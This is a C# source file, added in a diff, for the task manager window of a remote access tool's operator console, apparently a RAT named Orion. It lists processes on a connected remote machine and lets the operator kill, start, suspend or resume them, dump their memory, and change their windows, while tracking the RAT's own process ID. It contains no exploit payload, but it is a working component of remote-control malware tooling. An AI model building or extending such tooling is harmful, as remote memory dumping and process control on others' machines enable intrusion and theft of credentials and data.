@@ -1,0 +1,540 @@
+﻿using Orion.Common.Enums;
+using Orion.Common.Messages;
+using Orion.Common.Messages.Administration.TaskManager;
+using Orion.Common.Models;
+using Orion.Server.Controls;
+using Orion.Server.Controls.Wpf;
+using Orion.Server.Forms.DarkMode;
+using Orion.Server.Helper;
+using Orion.Server.Messages;
+using Orion.Server.Networking;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Orion.Server.Forms
+{
+    public partial class FrmTaskManager : Form
+    {
+        private readonly Client _connectClient;
+        private readonly TaskManagerHandler _taskManagerHandler;
+        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new();
+        private List<FrmMemoryDump> _memoryDumps = new();
+        private int? _ratPid = null;
+        private readonly ProcessTreeView _processTreeView;
+        private Orion.Common.Models.Process[] _currentProcesses = Array.Empty<Orion.Common.Models.Process>();
+        private ProcessTreeSortColumn _sortColumn = ProcessTreeSortColumn.Name;
+        private bool _sortAscending = true;
+
+        private readonly System.Windows.Forms.Timer _countdownTimer;
+        private int _countdownValue = 7;
+        private bool _pauseAutoRefresh = false;
+        private System.Drawing.Color _originalLabelColor;
+
+        // Ultra-light update management
+        private DateTime _lastUpdateTime = DateTime.MinValue;
+        private readonly TimeSpan _minimumUpdateInterval = TimeSpan.FromMilliseconds(500);
+        private readonly Queue<Orion.Common.Models.Process[]> _updateQueue = new Queue<Orion.Common.Models.Process[]>();
+        private bool _isProcessingQueue = false;
+        private readonly object _queueLock = new object();
+
+        public static FrmTaskManager CreateNewOrGetExisting(Client client)
+        {
+            if (OpenedForms.TryGetValue(client, out var form)) return form;
+            form = new FrmTaskManager(client);
+            form.Disposed += (s, e) => OpenedForms.Remove(client);
+            OpenedForms[client] = form;
+            return form;
+        }
+
+        public FrmTaskManager(Client client)
+        {
+            _connectClient = client;
+            _taskManagerHandler = new TaskManagerHandler(client);
+            _processTreeView = new ProcessTreeView();
+
+            InitializeComponent();
+            DarkModeManager.ApplyDarkMode(this);
+
+            _processTreeView.SortRequested += ProcessTreeView_SortRequested;
+            _processTreeView.SelectedProcessChanged += ProcessTreeView_SelectedProcessChanged;
+            processTreeHost.Child = _processTreeView;
+
+            _originalLabelColor = toolStripStatusLabel1.ForeColor;
+
+            _countdownTimer = new System.Windows.Forms.Timer { Interval = 1000 };
+            _countdownTimer.Tick += CountdownTimer_Tick;
+            _countdownTimer.Start();
+
+            RegisterMessageHandler();
+        }
+        private void AutoExpandFirstExplorer()
+        {
+            if (_processTreeView == null) return;
+
+            _processTreeView.FlattenNodes();
+
+            var allNodesField = typeof(ProcessTreeView)
+                .GetField("_allNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
+            if (allNodesField == null) return;
+
+            var allNodes = allNodesField.GetValue(_processTreeView) as List<ProcessTreeNode>;
+            if (allNodes == null || allNodes.Count == 0) return;
+
+            // Find the main explorer.exe: the one that has child processes
+            var node = allNodes
+                .Where(n => string.Equals(n.Name, "explorer.exe", StringComparison.OrdinalIgnoreCase))
+                .OrderByDescending(n => n.Children.Count) // choose the one with most children
+                .FirstOrDefault();
+
+            if (node != null)
+            {
+                // Expand the node's ancestors so the tree path is visible
+                void ExpandAncestors(ProcessTreeNode target)
+                {
+                    var rootNodesProperty = typeof(ProcessTreeView)
+                        .GetProperty("RootNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
+
+                    var rootNodes = rootNodesProperty?.GetValue(_processTreeView) as IEnumerable<ProcessTreeNode> ?? Enumerable.Empty<ProcessTreeNode>();
+
+                    foreach (var root in rootNodes)
+                    {
+                        if (TryExpandPath(root, target)) break;
+                    }
+
+                    bool TryExpandPath(ProcessTreeNode current, ProcessTreeNode targetNode)
+                    {
+                        if (current == targetNode) return true;
+
+                        foreach (var child in current.Children)
+                        {
+                            if (TryExpandPath(child, targetNode))
+                            {
+                                current.IsExpanded = true;
+                                return true;
+                            }
+                        }
+                        return false;
+                    }
+                }
+
+                ExpandAncestors(node);
+                node.IsExpanded = true; // only expand the main explorer.exe node
+            }
+        }
+
+
+
+
+
+
+        private void CountdownTimer_Tick(object sender, EventArgs e)
+        {
+            toolStripStatusLabel1.Text = $"{_countdownValue}秒后刷新...";
+
+            if (_countdownValue == 2)
+                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Yellow;
+            else if (_countdownValue == 1)
+                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Green;
+            else
+                toolStripStatusLabel1.ForeColor = _originalLabelColor;
+
+            if (_countdownValue > 0)
+            {
+                _countdownValue--;
+            }
+            else
+            {
+                if (!_pauseAutoRefresh)
+                    _ = Task.Run(() => _taskManagerHandler.RefreshProcesses());
+
+                _countdownValue = 7; // reset to 7 seconds
+                toolStripStatusLabel1.ForeColor = _originalLabelColor;
+            }
+        }
+
+        private void RegisterMessageHandler()
+        {
+            _connectClient.ClientState += ClientDisconnected;
+
+            _taskManagerHandler.ProgressChanged += (s, processes) =>
+            {
+                QueueProcessUpdate(processes, _taskManagerHandler.LastProcessesResponse?.RatPid);
+            };
+
+            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
+            _taskManagerHandler.OnResponseReceived += CreateMemoryDump;
+
+            // Register with MessageHandler if exists
+            MessageHandler.Register(_taskManagerHandler);
+        }
+
+        private void UnregisterMessageHandler()
+        {
+            MessageHandler.Unregister(_taskManagerHandler);
+            _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
+            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
+            _taskManagerHandler.Dispose();
+            _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void ClientDisconnected(Client client, bool connected)
+        {
+            if (!connected)
+            {
+                this.Invoke((MethodInvoker)this.Close);
+            }
+        }
+
+        private void QueueProcessUpdate(Orion.Common.Models.Process[] processes, int? ratPid)
+        {
+            lock (_queueLock)
+            {
+                _ratPid = ratPid;
+
+                _updateQueue.Clear();
+                _updateQueue.Enqueue(processes ?? Array.Empty<Orion.Common.Models.Process>());
+
+                if (!_isProcessingQueue)
+                {
+                    _isProcessingQueue = true;
+                    _ = Task.Run(ProcessUpdateQueue);
+                }
+            }
+        }
+
+        private async Task ProcessUpdateQueue()
+        {
+            while (true)
+            {
+                Orion.Common.Models.Process[] processesToUpdate = null;
+
+                lock (_queueLock)
+                {
+                    if (_updateQueue.Count == 0)
+                    {
+                        _isProcessingQueue = false;
+                        break;
+                    }
+                    processesToUpdate = _updateQueue.Dequeue();
+                }
+
+                if (processesToUpdate != null)
+                    await ProcessAndUpdateAsync(processesToUpdate);
+
+                await Task.Delay(10);
+            }
+        }
+
+        private async Task ProcessAndUpdateAsync(Orion.Common.Models.Process[] processes)
+        {
+            var timeSinceLastUpdate = DateTime.Now - _lastUpdateTime;
+            if (timeSinceLastUpdate < _minimumUpdateInterval)
+            {
+                await Task.Delay(_minimumUpdateInterval - timeSinceLastUpdate);
+            }
+
+            var processedData = await Task.Run(() => ProcessDataInBackground(processes));
+            await UpdateUIAsync(processedData);
+
+            _lastUpdateTime = DateTime.Now;
+        }
+
+        private ProcessDataResult ProcessDataInBackground(Orion.Common.Models.Process[] processes)
+        {
+            var sortedProcesses = SortProcesses(processes, _sortColumn, _sortAscending);
+
+            return new ProcessDataResult
+            {
+                Processes = sortedProcesses,
+                ProcessCount = processes.Length,
+                RatPid = _ratPid
+            };
+        }
+
+        private Orion.Common.Models.Process[] SortProcesses(Orion.Common.Models.Process[] processes, ProcessTreeSortColumn sortColumn, bool ascending)
+        {
+            if (processes == null || processes.Length == 0)
+                return processes;
+
+            try
+            {
+                IEnumerable<Orion.Common.Models.Process> ordered = sortColumn switch
+                {
+                    ProcessTreeSortColumn.Pid => processes.OrderBy(p => p.Id),
+                    ProcessTreeSortColumn.WindowTitle => processes.OrderBy(p => p.MainWindowTitle ?? ""),
+                    _ => processes.OrderBy(p => p.Name ?? "")
+                };
+
+                return ascending ? ordered.ToArray() : ordered.Reverse().ToArray();
+            }
+            catch
+            {
+                return processes;
+            }
+        }
+
+        private async Task UpdateUIAsync(ProcessDataResult data)
+        {
+            if (this.InvokeRequired)
+                await this.InvokeAsync(() =>
+                {
+                    _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
+                    AutoExpandFirstExplorer(); // call after update
+                });
+            else
+            {
+                _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
+                AutoExpandFirstExplorer();
+            }
+
+
+            UpdateStatusLabel(data.ProcessCount);
+        }
+
+
+        private void UpdateStatusLabel(int processCount)
+        {
+            string sortLabel = _sortColumn switch
+            {
+                ProcessTreeSortColumn.Pid => "PID",
+                ProcessTreeSortColumn.WindowTitle => "标题",
+                _ => "名称"
+            };
+            string orderLabel = _sortAscending ? "升序" : "降序";
+            processesToolStripStatusLabel.Text = $"进程数：{processCount} | 排序：{sortLabel} ({orderLabel})";
+        }
+
+        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
+        {
+            string text = action switch
+            {
+                ProcessAction.Start => result ? "进程启动成功" : "进程启动失败",
+                ProcessAction.End => result ? "进程结束成功" : "进程结束失败",
+                _ => string.Empty
+            };
+
+            if (this.InvokeRequired)
+                this.Invoke((MethodInvoker)(() => processesToolStripStatusLabel.Text = text));
+            else
+                processesToolStripStatusLabel.Text = text;
+        }
+
+        private void FrmTaskManager_Load(object sender, EventArgs e)
+        {
+            this.Text = WindowHelper.GetWindowTitle("任务管理器", _connectClient);
+            _ = Task.Run(() => _taskManagerHandler.RefreshProcesses());
+        }
+
+        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            _countdownTimer.Stop();
+            UnregisterMessageHandler();
+        }
+
+        private IEnumerable<Orion.Common.Models.Process> GetSelectedProcesses() =>
+            _processTreeView?.SelectedProcesses ?? Array.Empty<Orion.Common.Models.Process>();
+
+        private void ProcessTreeView_SortRequested(object sender, SortRequestedEventArgs e)
+        {
+            if (_sortColumn == e.Column)
+                _sortAscending = !_sortAscending;
+            else
+            {
+                _sortColumn = e.Column;
+                _sortAscending = true;
+            }
+
+            if (_currentProcesses.Length > 0)
+                _ = Task.Run(() => ProcessAndUpdateAsync(_currentProcesses));
+        }
+
+        private void ProcessTreeView_SelectedProcessChanged(object sender, EventArgs e) { }
+
+        private void CreateMemoryDump(object sender, DoProcessDumpResponse response)
+        {
+            if (response.Result)
+            {
+                this.Invoke((MethodInvoker)(() =>
+                {
+                    var dumpFrm = FrmMemoryDump.CreateNewOrGetExisting(_connectClient, response);
+                    _memoryDumps.Add(dumpFrm);
+                    dumpFrm.Show();
+                }));
+            }
+            else
+            {
+                string reason = string.IsNullOrEmpty(response.FailureReason) ? "" : $"原因：{response.FailureReason}";
+                MessageBox.Show($"转储进程失败！\n{reason}", $"转储进程失败 ({response.Pid}) - {response.ProcessName}");
+            }
+        }
+
+        public void SetAutoRefreshEnabled(bool enabled) => _pauseAutoRefresh = !enabled;
+
+        private void PerformOnSelectedProcesses(Action<Orion.Common.Models.Process> action)
+        {
+            _pauseAutoRefresh = true;
+            try
+            {
+                var selected = GetSelectedProcesses().ToList();
+                foreach (var process in selected)
+                    action(process);
+            }
+            finally
+            {
+                _pauseAutoRefresh = false;
+            }
+        }
+
+        #region Menu Actions
+        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.EndProcess(p.Id));
+
+        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string processName = string.Empty;
+            if (InputBox.Show("进程名称", "输入进程名称：", ref processName) == DialogResult.OK)
+                _taskManagerHandler.StartProcess(processName);
+        }
+
+        private void refreshToolStripMenuItem_Click(object sender, EventArgs e) =>
+            _taskManagerHandler.RefreshProcesses();
+
+        private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.DumpProcess(p.Id));
+
+        // Suspend selected processes
+        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SuspendProcess(p.Id, true));
+
+        // Resume selected processes
+        private void resumeProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SuspendProcess(p.Id, false));
+
+
+        private void topmostOnToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, true));
+
+        private void topmostOffToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, false));
+
+        // New: Minimize / Maximize
+        private void minimizedToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, true));
+
+        private void maximizedToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, false));
+        #endregion
+
+        private string _lastSearchKeyword = ""; // Stores last search
+
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+            // Handle Ctrl + F globally
+            if (keyData == (Keys.Control | Keys.F))
+            {
+                ShowSearchDialog();
+                return true;
+            }
+            return base.ProcessCmdKey(ref msg, keyData);
+        }
+
+        private void ShowSearchDialog()
+        {
+            string prompt = "按名称、窗口标题或 PID 搜索。输入以空格分隔的关键词。保持文本选中状态并点击回车/确定以查找下一个。";
+
+            string keyword = Microsoft.VisualBasic.Interaction.InputBox(
+                prompt,
+                "查找进程",
+                _lastSearchKeyword);
+
+            if (string.IsNullOrWhiteSpace(keyword))
+                keyword = _lastSearchKeyword;
+
+            if (!string.IsNullOrWhiteSpace(keyword))
+            {
+                _lastSearchKeyword = keyword.Trim();
+                _processTreeView.FlattenNodes();
+                _processTreeView.FindNext(_lastSearchKeyword);
+            }
+        }
+
+
+
+
+        // Optional: keep your menu item wired up too
+        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ShowSearchDialog();
+        }
+
+        private void enableDisableAutoRefreshToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            // Toggle auto-refresh
+            _pauseAutoRefresh = !_pauseAutoRefresh;
+
+            // Toggle menu item checkmark
+            if (sender is ToolStripMenuItem menuItem)
+                menuItem.Checked = !_pauseAutoRefresh;
+
+            // Update status label
+            if (_pauseAutoRefresh)
+            {
+                toolStripStatusLabel1.Text = "自动刷新已禁用";
+                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Red;
+                _countdownTimer.Stop(); // stop ticking
+            }
+            else
+            {
+                toolStripStatusLabel1.Text = $"{_countdownValue}秒后刷新...";
+                toolStripStatusLabel1.ForeColor = _originalLabelColor;
+                _countdownTimer.Start(); // resume ticking
+            }
+        }
+        private void SetSuspendStateForSelectedProcesses(bool suspend)
+        {
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SuspendProcess(p.Id, suspend));
+        }
+
+        private void beginSuspendToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SetSuspendStateForSelectedProcesses(true);
+        }
+
+        private void endSuspendToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SetSuspendStateForSelectedProcesses(false);
+        }
+
+    }
+
+    public class ProcessDataResult
+    {
+        public Orion.Common.Models.Process[] Processes { get; set; } = Array.Empty<Orion.Common.Models.Process>();
+        public int ProcessCount { get; set; }
+        public int? RatPid { get; set; }
+    }
+
+    public static class ControlExtensions
+    {
+        public static Task InvokeAsync(this Control control, Action action)
+        {
+            var tcs = new TaskCompletionSource<object>();
+            control.BeginInvoke((Action)(() =>
+            {
+                try
+                {
+                    action();
+                    tcs.SetResult(null);
+                }
+                catch (Exception ex)
+                {
+                    tcs.SetException(ex);
+                }
+            }));
+            return tcs.Task;
+        }
+    }
+}
